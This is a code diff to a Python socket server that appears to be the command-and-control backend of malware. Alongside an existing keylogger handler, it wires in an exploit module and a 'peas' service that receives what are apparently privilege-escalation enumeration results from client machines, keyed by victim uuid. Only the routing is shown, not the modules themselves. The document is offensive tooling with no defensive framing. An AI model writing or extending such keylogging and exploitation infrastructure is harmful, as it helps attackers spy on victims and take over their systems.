@@ -6,6 +6,7 @@ from dataManager.repository.userRepository import UserRepository
 import logging
 from modules.KeyloggerModule import KeyloggerModule
 from modules.Recognizer import Recognizer
+from modules.ExploitModule import ExploitModule
 from app_state import AppState
 
 class SocketServer:
@@ -19,6 +20,7 @@ class SocketServer:
         self.lock = app_state.lock
         self.keylogger = KeyloggerModule(self.user_repository)
         self.recognizer = Recognizer(self.user_repository)
+        self.exploit_module = ExploitModule(self.user_repository)
 
     async def handle_client(self, reader: asyncio.StreamReader, writer : asyncio.StreamWriter):
 
@@ -79,6 +81,9 @@ class SocketServer:
             #await self.keylogger.inject(uuid)
         elif service == "keylogger":
             await self.keylogger.action(params, uuid)
+            return "[close]"
+        elif service == "peas":
+            await self.exploit_module.peas_receive_socket(params, uuid)
             return "[close]"
         else:
             logging.error(f"Unknown service: {service}")
